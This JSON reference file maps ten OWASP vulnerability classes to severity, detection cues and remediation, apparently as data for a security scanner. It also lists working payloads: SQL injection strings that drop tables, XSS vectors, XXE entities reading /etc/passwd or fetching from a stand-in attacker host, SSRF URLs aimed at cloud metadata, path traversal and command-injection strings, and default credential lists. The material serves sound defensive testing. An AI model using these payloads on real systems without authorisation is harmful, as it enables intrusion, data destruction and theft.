{
    "sql_injection": {
        "severity": "CRITICAL",
        "owasp_id": "A03:2021",
        "category": "Injection",
        "description": "SQL Injection permite que atacantes executem comandos SQL arbitrários no banco de dados",
        "payloads": [
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "admin' --",
            "' OR 1=1--",
            "1' AND '1'='1",
            "' UNION SELECT username, password FROM users--",
            "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--"
        ],
        "detection_patterns": [
            "SQL syntax error",
            "mysql_fetch",
            "ORA-01756",
            "Microsoft SQL Native Client error",
            "Unclosed quotation mark"
        ],
        "remediation": "Use prepared statements, parameterized queries, ORM frameworks, input validation",
        "impact": "Data breach, data manipulation, authentication bypass, complete system compromise"
    },
    "xss": {
        "severity": "HIGH",
        "owasp_id": "A03:2021",
        "category": "Injection",
        "description": "Cross-Site Scripting permite injeção de scripts maliciosos em páginas web",
        "types": [
            "reflected",
            "stored",
            "dom-based"
        ],
        "payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ],
        "detection": "Script execution in browser, DOM manipulation, cookie theft",
        "remediation": "Sanitize inputs with DOMPurify, implement Content Security Policy, encode outputs, use frameworks with auto-escaping",
        "impact": "Session hijacking, credential theft, malware distribution, phishing"
    },
    "csrf": {
        "severity": "HIGH",
        "owasp_id": "A01:2021",
        "category": "Broken Access Control",
        "description": "Cross-Site Request Forgery força usuários autenticados a executar ações não intencionais",
        "detection_methods": [
            "Missing CSRF tokens",
            "Predictable CSRF tokens",
            "CSRF token not validated",
            "GET requests for state-changing operations"
        ],
        "remediation": "Implement anti-CSRF tokens, use SameSite cookies, validate Referer header, require re-authentication for sensitive actions",
        "impact": "Unauthorized actions, data modification, account takeover"
    },
    "weak_passwords": {
        "severity": "CRITICAL",
        "owasp_id": "A07:2021",
        "category": "Identification and Authentication Failures",
        "description": "Senhas fracas facilitam ataques de brute force e credential stuffing",
        "common_passwords": [
            "123456",
            "password",
            "123456789",
            "12345678",
            "12345",
            "1234567",
            "admin",
            "123123",
            "qwerty",
            "abc123",
            "password123",
            "admin123",
            "root",
            "toor",
            "pass"
        ],
        "common_usernames": [
            "admin",
            "administrator",
            "root",
            "user",
            "test",
            "guest",
            "demo",
            "webmaster",
            "support"
        ],
        "detection": "Successful login with weak credentials, no password complexity requirements",
        "remediation": "Enforce strong password policy (min 12 chars, complexity), implement rate limiting, use MFA, password strength meter, breach detection",
        "impact": "Account compromise, unauthorized access, data breach"
    },
    "session_hijacking": {
        "severity": "CRITICAL",
        "owasp_id": "A07:2021",
        "category": "Identification and Authentication Failures",
        "description": "Roubo ou predição de IDs de sessão para impersonar usuários",
        "attack_vectors": [
            "Session fixation",
            "Session prediction",
            "Session sniffing",
            "XSS-based session theft"
        ],
        "detection": "Predictable session IDs, session ID in URL, no session regeneration after login",
        "remediation": "Regenerate session ID after login, use secure and httpOnly cookies, implement session timeout, use HTTPS only",
        "impact": "Account takeover, unauthorized access, identity theft"
    },
    "insecure_headers": {
        "severity": "MEDIUM",
        "owasp_id": "A05:2021",
        "category": "Security Misconfiguration",
        "description": "Falta de headers de segurança HTTP expõe aplicação a diversos ataques",
        "required_headers": {
            "X-Frame-Options": "DENY or SAMEORIGIN",
            "X-Content-Type-Options": "nosniff",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": "default-src 'self'",
            "X-XSS-Protection": "1; mode=block",
            "Referrer-Policy": "no-referrer-when-downgrade"
        },
        "remediation": "Configure all security headers properly, use helmet.js for Node.js, implement CSP",
        "impact": "Clickjacking, MIME sniffing attacks, man-in-the-middle attacks"
    },
    "xxe": {
        "severity": "CRITICAL",
        "owasp_id": "A05:2021",
        "category": "Security Misconfiguration",
        "description": "XML External Entity injection permite leitura de arquivos e SSRF",
        "payloads": [
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/evil\">]><foo>&xxe;</foo>"
        ],
        "detection": "File disclosure, SSRF, denial of service",
        "remediation": "Disable XML external entities, use JSON instead of XML, validate and sanitize XML input",
        "impact": "File disclosure, SSRF, denial of service, remote code execution"
    },
    "insecure_deserialization": {
        "severity": "CRITICAL",
        "owasp_id": "A08:2021",
        "category": "Software and Data Integrity Failures",
        "description": "Desserialização insegura pode levar a execução remota de código",
        "detection": "Untrusted data deserialization, base64 encoded objects",
        "remediation": "Avoid deserializing untrusted data, implement integrity checks, use safe serialization formats like JSON",
        "impact": "Remote code execution, privilege escalation, data tampering"
    },
    "ssrf": {
        "severity": "HIGH",
        "owasp_id": "A10:2021",
        "category": "Server-Side Request Forgery",
        "description": "SSRF permite que atacantes façam requisições a partir do servidor",
        "payloads": [
            "http://localhost:8080/admin",
            "http://169.254.169.254/latest/meta-data/",
            "file:///etc/passwd",
            "http://internal-server/"
        ],
        "detection": "Server making unexpected outbound requests, access to internal resources",
        "remediation": "Validate and sanitize URLs, use allowlist of domains, disable unnecessary protocols, implement network segmentation",
        "impact": "Access to internal systems, cloud metadata exposure, port scanning"
    },
    "path_traversal": {
        "severity": "HIGH",
        "owasp_id": "A01:2021",
        "category": "Broken Access Control",
        "description": "Path traversal permite acesso a arquivos fora do diretório pretendido",
        "payloads": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ],
        "detection": "Unauthorized file access, directory listing",
        "remediation": "Validate file paths, use chroot jail, implement proper access controls, avoid user input in file paths",
        "impact": "Sensitive file disclosure, configuration file access, source code exposure"
    },
    "command_injection": {
        "severity": "CRITICAL",
        "owasp_id": "A03:2021",
        "category": "Injection",
        "description": "Command injection permite execução de comandos arbitrários no sistema operacional",
        "payloads": [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(cat /etc/passwd)"
        ],
        "detection": "Unexpected command execution, system command output in response",
        "remediation": "Avoid system calls with user input, use parameterized APIs, implement input validation, use safe libraries",
        "impact": "Complete system compromise, data breach, malware installation"
    }
}